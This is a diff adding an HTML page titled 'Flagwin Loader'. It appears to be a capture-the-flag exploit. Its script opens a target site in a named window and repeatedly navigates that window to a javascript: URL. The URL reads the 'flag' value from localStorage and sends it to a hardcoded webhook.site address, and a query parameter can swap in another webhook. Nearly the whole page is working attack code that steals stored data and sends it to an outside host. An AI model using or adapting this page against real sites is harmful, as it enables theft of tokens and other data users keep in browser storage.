@@ -1,0 +1,137 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Flagwin Loader</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      --bg: #0b1020;
+      --panel: #121933;
+      --text: #e8ecff;
+      --muted: #9aa4c7;
+      --accent: #7c9cff;
+      --border: #273158;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      font: 16px/1.5 system-ui, sans-serif;
+      background: radial-gradient(circle at top, #1a2450 0%, var(--bg) 55%);
+      color: var(--text);
+      padding: 24px;
+    }
+
+    main {
+      width: min(720px, 100%);
+      background: color-mix(in srgb, var(--panel) 92%, black);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 24px;
+      box-shadow: 0 24px 80px rgba(0, 0, 0, 0.35);
+    }
+
+    h1 {
+      margin: 0 0 12px;
+      font-size: clamp(1.8rem, 4vw, 2.5rem);
+    }
+
+    p {
+      margin: 0 0 12px;
+      color: var(--muted);
+    }
+
+    code {
+      color: var(--text);
+      background: rgba(124, 156, 255, 0.12);
+      border: 1px solid rgba(124, 156, 255, 0.2);
+      border-radius: 8px;
+      padding: 0.15rem 0.4rem;
+    }
+
+    #status {
+      color: var(--text);
+      font-weight: 600;
+    }
+
+    .hint {
+      margin-top: 18px;
+      padding-top: 18px;
+      border-top: 1px solid var(--border);
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>Flagwin Loader</h1>
+    <p id="status">Preparing exploit...</p>
+    <div class="hint">
+      <p>Default webhook configured. Optional override: <code>?token=&lt;webhook-site-token&gt;</code> or <code>?hook=https://webhook.site/&lt;token&gt;</code>.</p>
+      <p>Optional: <code>?target=http://localhost:1337/</code></p>
+    </div>
+  </main>
+
+  <script>
+    const DEFAULT_HOOK = 'https://webhook.site/24c8d56f-0f26-4940-88d9-fbf772754fad';
+    const params = new URLSearchParams(location.search);
+    const token = (params.get('token') || '').trim();
+    const hookParam = (params.get('hook') || '').trim();
+    const target = (params.get('target') || 'http://localhost:1337/').trim();
+    const statusEl = document.getElementById('status');
+
+    const hook = hookParam || (token ? `https://webhook.site/${token}` : DEFAULT_HOOK);
+
+    function setStatus(message) {
+      statusEl.textContent = message;
+    }
+
+    const separator = hook.includes('?') ? '&' : '?';
+    const exfilBase = `${hook}${separator}flag=`;
+    const js = `javascript:(()=>{location=${JSON.stringify(exfilBase)}+encodeURIComponent(localStorage.getItem("flag")||"")})()`;
+
+    setStatus(`Launching target ${target}`);
+
+    let popup = null;
+    try {
+      popup = window.open(target, 'flagwin');
+    } catch (error) {
+      setStatus(`Popup open failed: ${error}`);
+    }
+
+    setTimeout(() => {
+      try {
+        if (popup) {
+          popup.location = js;
+        }
+      } catch (error) {
+        setStatus(`Direct navigation blocked: ${error}`);
+      }
+    }, 900);
+
+    setTimeout(() => {
+      try {
+        window.open(js, 'flagwin');
+      } catch (error) {
+        setStatus(`Named window retry 1 failed: ${error}`);
+      }
+    }, 1700);
+
+    setTimeout(() => {
+      try {
+        window.open(js, 'flagwin');
+        setStatus('Exploit dispatched. Check your webhook logs.');
+      } catch (error) {
+        setStatus(`Named window retry 2 failed: ${error}`);
+      }
+    }, 2700);
+  </script>
+</body>
+</html>
